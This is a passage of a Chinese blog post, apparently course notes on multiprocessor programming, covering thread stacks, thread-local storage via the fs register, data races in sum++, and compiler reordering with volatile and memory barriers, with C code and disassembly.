class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    create(Tprobe);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把输出缓冲区关了，起了四个线程，每个线程都会Tprobe作为入口点，tid在相对高地址栈上，把栈地址给了base，调用StackOverflow</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404185540104.png" alt="image-20230404185540104"></p><p>n始终在在栈rbp-0x24偏移处，最后会递归自己，每1024次会计算一次n距离栈底的距离，没有终止条件，栈一直在栈，始终有一天会真正的stackoverflow，我们就可以估计栈的大小</p><p>我们可以通过pipe 把结果给sort排序</p><p><code>./stack-probe | sort -nk 6</code></p><ul><li>-k选择一列</li><li>-n把某一列当作数字排序</li></ul><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404195902138.png" alt="image-20230404195902138"></p><p>猜测出栈的大小默认也就是8M</p><h3 id="线程内存模型"><a href="#线程内存模型" class="headerlink" title="线程内存模型"></a>线程内存模型</h3><p>一组并发线程运行在一个进程的上下文中,各自独立的线程栈的内存模型不是那么整齐清楚的。栈被保存在虚拟地址空间的栈区域中,线程栈是不对其他线程设防的，所以如果一个线程得到另一个线程的栈指针，也是可以进行访问修改</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">show</span><span class="params">(<span class="type">void</span>* ptr)</span> &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, <span class="string">&quot;grxer&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;grxer&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    pthread_create(&amp;id, <span class="literal">NULL</span>, show,(<span class="type">void</span>*) name);</span><br><span class="line">    pthread_join(id, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  %s&quot;</span>, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -g -o  test test.c -pthread</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">hello  grxer⏎    </span><br></pre></td></tr></table></figure><h3 id="如何改变这个堆栈大小"><a href="#如何改变这个堆栈大小" class="headerlink" title="如何改变这个堆栈大小?"></a>如何改变这个堆栈大小?</h3><blockquote><p>可以利用pthread_create第二个参数线程属性在创建线程时做操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Data structure for condition variable handling.  The structure of</span></span><br><span class="line"><span class="comment">   the attribute type is not exposed on purpose.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> __size[__SIZEOF_PTHREAD_CONDATTR_T];</span><br><span class="line">  <span class="type">int</span> __align;</span><br><span class="line">&#125; <span class="type">pthread_condattr_t</span>;</span><br></pre></td></tr></table></figure><p>没有公开类型，但是给我们了api</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_init</span><span class="params">(<span class="type">pthread_attr_t</span> *attr)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_getstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> *stacksize)</span>; </span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_attr_setstacksize</span><span class="params">(<span class="type">pthread_attr_t</span> *attr, <span class="type">size_t</span> stacksize)</span>;</span><br><span class="line">返回值<span class="number">0</span>，<span class="number">-1</span>分别表示成功与失败，这里的stacksize都是以byte为单位</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> id;</span><br><span class="line">    <span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line">    <span class="type">size_t</span> stacksize;</span><br><span class="line">    <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;before:%zu\n&quot;</span>, stacksize);</span><br><span class="line">    res = pthread_attr_setstacksize(&amp;thread_attr,<span class="number">10485760</span>);</span><br><span class="line">    assert(!res);</span><br><span class="line">    res = pthread_attr_getstacksize(&amp;thread_attr, &amp;stacksize);</span><br><span class="line">    assert(!res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after:%zu\n&quot;</span>, stacksize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./test</span><br><span class="line">before:<span class="number">8388608</span></span><br><span class="line">after:<span class="number">10485760</span></span><br></pre></td></tr></table></figure><p>我们这样去改造一下<code>thread.h</code>就好</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_attr_t</span> thread_attr;</span><br><span class="line"> <span class="type">int</span> res = pthread_attr_init(&amp;thread_attr);</span><br><span class="line"> assert(!res);</span><br><span class="line"> res = pthread_attr_setstacksize(&amp;thread_attr, <span class="number">10485760</span>);</span><br><span class="line"> assert(!res);</span><br><span class="line"> pthread_create(&amp;(tptr-&gt;thread), &amp;thread_attr, wrapper, tptr);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404203402253.png" alt="image-20230404203402253"></p></blockquote><h3 id="thread浅谈"><a href="#thread浅谈" class="headerlink" title="__thread浅谈"></a>__thread浅谈</h3><p><strong>Thread Local Storage</strong>，之前劫持过tls来bypass canary，但是对底层理解并不深，这次有了新的体会，但是也只是浅谈，好多东西还没搞懂，要去补补保护模式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_cur</span><br><span class="line">.text:0000000000001388 55                            push    rbp</span><br><span class="line">.text:0000000000001389 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000000138C 64 48 8B 04 25 F0 FF FF FF    mov     rax, fs:0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000001395 5D                            pop     rbp</span><br></pre></td></tr></table></figure><p>还是和fs段寄存器有关，其实准确来说，自从8086的实模式过后，cs ss ds es等段寄存器里面存的不再是为了满足20位地址总线和重定位的物理段基地址，在保护模式下变为了段选择字，现在更应该叫段选择器，保护模式下会有用户态不可见的部分，叫做描述符高速缓冲器(是一个缓存，每次进行段解析后保存再里面)，由处理器自动使用，而真正的段地址就在这里面</p><p><strong>有以下方式去获得fs段地址</strong></p><p>&gt;&gt;&gt;通过内联汇编的方式</p><p>&gt;&gt;&gt;<a href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/arch_prctl.2.html">系统调用int arch_prctl(int code, unsigned long *addr)</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> fs_value2;</span><br><span class="line">    <span class="type">pthread_t</span> pid = pthread_self();</span><br><span class="line">    <span class="type">int</span> ret = arch_prctl(ARCH_GET_FS,&amp;fs_value2); </span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (fs_value))</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;FS寄存器的值为: 0x%lx\narch_prctl:0x%lx\npid:0x%lx&quot;</span>, fs_value,fs_value2,pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grxer@grxer ~/D/s/N/ctest&gt; ./test</span><br><span class="line">FS寄存器的值为: <span class="number">0x7ffff7fa6740</span></span><br><span class="line">arch_prctl:<span class="number">0x7ffff7fa6740</span></span><br><span class="line">pid:<span class="number">0x7ffff7fa6740</span>⏎   </span><br></pre></td></tr></table></figure><p>&gt;&gt;&gt;gdb的<code>fsbase命令</code>或<code>p/x pthread_self()</code>获得这个值</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404205339561.png" alt="image-20230404205339561"></p><p>这里才惊奇的发现gdb里可以直接运行c函数</p><p>可以看到POSIX线程库的pthread_create返回给我们的tidp是每个线程的fs段地址</p><p>观察一下程序里定义的__thread变量和汇编里的关系</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">base:.text:<span class="number">0000000000001435</span> <span class="number">64</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> F8 FF FF FF       mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFF8h(<span class="number">-8</span>), eax</span><br><span class="line">cur：.text:<span class="number">000000000000138</span>C <span class="number">64</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> F0 FF FF FF    mov     rax, fs:<span class="number">0F</span>FFFFFFFFFFFFFF0h(<span class="number">-16</span>)</span><br><span class="line">id：.text:<span class="number">0000000000001441</span> <span class="number">64</span> <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">25</span> E8 FF FF FF    mov     fs:<span class="number">0F</span>FFFFFFFFFFFFFE8h(<span class="number">-24</span>), rax</span><br></pre></td></tr></table></figure><p>在fs-8处开始排列，他的下面也就是我们的之前看的canary和__exit_funcs析构函数组的key，pthread_create去创建一个进程是用mmap一块内存当作堆栈，fs则位于这个堆栈的高地址处，也就是堆栈的底部</p><h2 id="原子性的丧失"><a href="#原子性的丧失" class="headerlink" title="原子性的丧失"></a>原子性的丧失</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100000000</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsum</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    sum++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就连单处理器并发都得不到正确的结果。<code>taskset -c cpu-cpu &lt;command&gt;</code>限制在cpu-cpu个处理器上运行</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235118554.png" alt="image-20230404235118554"></p><p>多处理器线程在并行，偏差更大</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404235238898.png" alt="image-20230404235238898"></p><p>具体来说，当一个线程正在读取sum的值时，另一个线程可能已经修改了sum的值，但是第一个线程并不知道。这可能导致一个线程覆盖了另一个线程的结果，从而导致最终结果错误。</p><p>sum++翻译为汇编是三条指令，取出，+1，写回，这也就是我们单处理器为什么会出错原因</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 48 8B 05 DF 31 00 00          mov     rax, cs:sum</span><br><span class="line">.text:0000000000001461 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001465 48 89 05 D4 31 00 00          mov     cs:sum, rax</span><br></pre></td></tr></table></figure><p>我们用内联汇编把sum++改为一句</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;add $1,%0&quot;</span>:<span class="string">&quot;+m&quot;</span>(sum))</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000145A 83 05 DF 31 00 00 01          add     dword ptr cs:sum, 1</span><br></pre></td></tr></table></figure><p>此时单核处理器没有多处理器乱序的并行，可以正常得到结果</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000115259.png" alt="image-20230405000115259"></p><p>多核处理器依旧出差，不过误差低了一点</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405000145046.png" alt="image-20230405000145046"></p><h2 id="顺序的丧失"><a href="#顺序的丧失" class="headerlink" title="顺序的丧失"></a>顺序的丧失</h2><ul><li>用gcc对程序进行-O1的优化发现每次运行结果都是sum &#x3D; 100000000</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001223</span><br><span class="line">.text:0000000000001223                               ; void __cdecl Tsum()</span><br><span class="line">.text:0000000000001223                               public Tsum</span><br><span class="line">.text:0000000000001223                               Tsum proc near                          ; DATA XREF: main+5↓o</span><br><span class="line">.text:0000000000001223                               ; __unwind &#123;</span><br><span class="line">.text:0000000000001223 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000001227 48 8B 15 12 2E 00 00          mov     rdx, cs:sum</span><br><span class="line">.text:000000000000122E 48 8D 42 01                   lea     rax, [rdx+1]</span><br><span class="line">.text:0000000000001232 48 81 C2 01 E1 F5 05          add     rdx, 5F5E101h</span><br><span class="line">.text:0000000000001232</span><br><span class="line">.text:0000000000001239</span><br><span class="line">.text:0000000000001239                               loc_1239:                               ; CODE XREF: Tsum+20↓j</span><br><span class="line">.text:0000000000001239 48 89 C1                      mov     rcx, rax</span><br><span class="line">.text:000000000000123C 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001240 48 39 D0                      cmp     rax, rdx</span><br><span class="line">.text:0000000000001243 75 F4                         jnz     short loc_1239</span><br><span class="line">.text:0000000000001243</span><br><span class="line">.text:0000000000001245 48 89 0D F4 2D 00 00          mov     cs:sum, rcx</span><br><span class="line">.text:000000000000124C C3                            retn</span><br></pre></td></tr></table></figure><p>-01的优化保留了循环，但是优化了每次写回内存的操作，用rcx寄存器代替</p><p><code>mov     cs:sum, rcx</code>最后写回的这一步决定了<code>sum = 100000000</code></p><ul><li>-O2优化 每次运行结果sum &#x3D; 200000000</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001290</span>                               ; <span class="type">void</span> __cdecl <span class="title function_">Tsum</span><span class="params">()</span></span><br><span class="line">.text:0000000000001290                               public Tsum</span><br><span class="line">.text:0000000000001290                               Tsum proc near                          ; DATA XREF: main+<span class="number">5</span>↑o</span><br><span class="line">.text:<span class="number">0000000000001290</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001290</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">48</span> <span class="number">81</span> <span class="number">05</span> A1 <span class="number">2</span>D <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> E1 F5+add     cs:sum, <span class="number">5F</span>5E100h</span><br><span class="line">.text:<span class="number">0000000000001294</span> <span class="number">05</span></span><br><span class="line">.text:<span class="number">000000000000129F</span> C3                            retn</span><br></pre></td></tr></table></figure><p>循环也没有了，直接把正确结果一个add，得到正确结果，但是这只是一个假象，和前面一句add汇编一样，当一个线程正在读取sum的值时，另一个线程可能已经修改了sum的值，我们只是两个线程去add，只是错误得几率很小，我们把线程增加到14，14次竞争add就已经有可见概率错误了</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230405004225147.png" alt="image-20230405004225147"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> done;</span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!done) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一一段代码我们只编译不链接</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    55                   push   %rbp</span><br><span class="line">   5:    48 89 e5             mov    %rsp,%rbp</span><br><span class="line">   8:    90                   nop</span><br><span class="line">   9:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # f &lt;join+0xf&gt;</span><br><span class="line">   f:    85 c0                test   %eax,%eax</span><br><span class="line">  11:    74 f6                je     9 &lt;join+0x9&gt;</span><br><span class="line">  13:    90                   nop</span><br><span class="line">  14:    90                   nop</span><br><span class="line">  15:    5d                   pop    %rbp</span><br><span class="line">  16:    c3                   ret    </span><br></pre></td></tr></table></figure><p>没加优化，每一次都会把done取出来，判断done是否为0</p><p>-O1优化</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O1 -c test.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;join&gt;:</span><br><span class="line">   <span class="number">0</span>:    f3 <span class="number">0f</span> <span class="number">1</span>e fa          endbr64 </span><br><span class="line">   <span class="number">4</span>:    <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov    <span class="number">0x0</span>(%rip),%eax        <span class="meta"># a <span class="string">&lt;join+0xa&gt;</span></span></span><br><span class="line">   a:    <span class="number">85</span> c0                test   %eax,%eax</span><br><span class="line">   c:    <span class="number">74</span> fc                je     a &lt;join+<span class="number">0xa</span>&gt;</span><br><span class="line">   e:    c3                   ret    </span><br></pre></td></tr></table></figure><p>只进行了一次取出done，多次判断相当于</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(x=done))&#123;</span><br><span class="line">    <span class="keyword">while</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们知道这个done为全局变量，万一被某个线程改掉了呢？就叛变了原本的逻辑</p><p>-O2优化</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; objdump -d test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;join&gt;:</span><br><span class="line">   0:    f3 0f 1e fa          endbr64 </span><br><span class="line">   4:    8b 05 00 00 00 00    mov    0x0(%rip),%eax        # a &lt;join+0xa&gt;</span><br><span class="line">   a:    85 c0                test   %eax,%eax</span><br><span class="line">   c:    75 02                jne    10 &lt;join+0x10&gt;</span><br><span class="line">   e:    eb fe                jmp    e &lt;join+0xe&gt;</span><br><span class="line">  10:    c3                   ret   </span><br></pre></td></tr></table></figure><p>更离谱了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!done)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解决办法</strong></p><p>给编译器加一下限制</p><ul><li><p>Memory Barrier</p><blockquote><p>asm volatile (“” ::: “memory”)</p><p>volatile告诉编译器不要对这条指令优化</p><p>memory 表示指令以不可预测的方式修改了内存， 强制gcc编译器假设RAM所有内存单元均被汇编指令修改，这样cpu中的registers和cache中已缓存的内存单元中的数据将作废。cpu将不得不在需要的时候重新读取内存中的数据。</p></blockquote></li><li><p>使用volatile变量</p><blockquote><p><strong>extern</strong> int <strong>volatile</strong> done;</p><p>volatile 指出 done 是随时可能发生变化的，每次使用它的时候必须从done的内存地址中读取，即使cache或寄存器里有</p></blockquote></li></ul><h2 id="可见性的丧失"><a href="#可见性的丧失" class="headerlink" title="可见性的丧失"></a>可见性的丧失</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">atomic_int</span> flag;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG atomic_load(&amp;flag)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAG_XOR(val) atomic_fetch_xor(&amp;flag, val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT_FOR(cond) while (!(cond)) ;</span></span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_x_read_y</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> y_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(x), <span class="string">&quot;=r&quot;</span>(y_val) : <span class="string">&quot;m&quot;</span>(y)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, y_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_y_read_x</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x_val;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1</span></span></span><br><span class="line"><span class="params">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span></span><br><span class="line"><span class="params">    : <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span></span><br><span class="line"><span class="params">  )</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, x_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T1</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">1</span>));</span><br><span class="line">    write_x_read_y();</span><br><span class="line">    FLAG_XOR(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">T2</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">2</span>));</span><br><span class="line">    write_y_read_x();</span><br><span class="line">    FLAG_XOR(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tsync</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">    __sync_synchronize(); <span class="comment">// full barrier</span></span><br><span class="line">    usleep(<span class="number">1</span>);            <span class="comment">// + delay</span></span><br><span class="line">    assert(FLAG == <span class="number">0</span>);</span><br><span class="line">    FLAG_XOR(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// T1 and T2 clear 0/1-bit, respectively</span></span><br><span class="line">    WAIT_FOR(FLAG == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(T1);</span><br><span class="line">  create(T2);</span><br><span class="line">  create(Tsync);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p><a href="https://en.cppreference.com/w/c/atomic">https://en.cppreference.com/w/c/atomic</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/_005f_005fatomic-Builtins.html</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins">https://gcc.gnu.org/onlinedocs/gcc-4.4.7/gcc/Atomic-Builtins.html#Atomic-Builtins</a></p><p>原子变量及原子操作是c11引入，&lt;stdatomic.h&gt;</p><p>原子变量的操作是原子操作(atomic operation),原子操作指的是不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，在同一个cpu时间片中完成,中间不会有任何的上下文切换。用于实现高效、正确、线程安全的并发编程</p></li></ul></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Built-in Function: <span class="type">void</span> __atomic_load (type *ptr, type *ret, <span class="type">int</span> memorder)</span><br><span class="line">This is the generic version of an atomic load. It returns the contents of *ptr in *ret.</span><br></pre></td></tr></table></figure><p>首先用来原子变量的flag的低两个bit当作开关</p><p>初始时为00，最低bit为1时T1打开，倒二bit为1时T2打开</p><p>Tsync是我们的控制线程中<code>FLAG_XOR(3)</code>同时把T1T2打开，然后T1T2同时执行，不管哪一个线程快一点慢一点，得到的结果只能是01 10 11，执行过后会把自己对应的开关置零关闭</p><p>根据该程序的状态机模型是不可能出现00的，但是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; gcc -O2 -g -o mem-ordering mem-ordering.c</span><br><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">7970</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">1756</span> <span class="number">0</span> 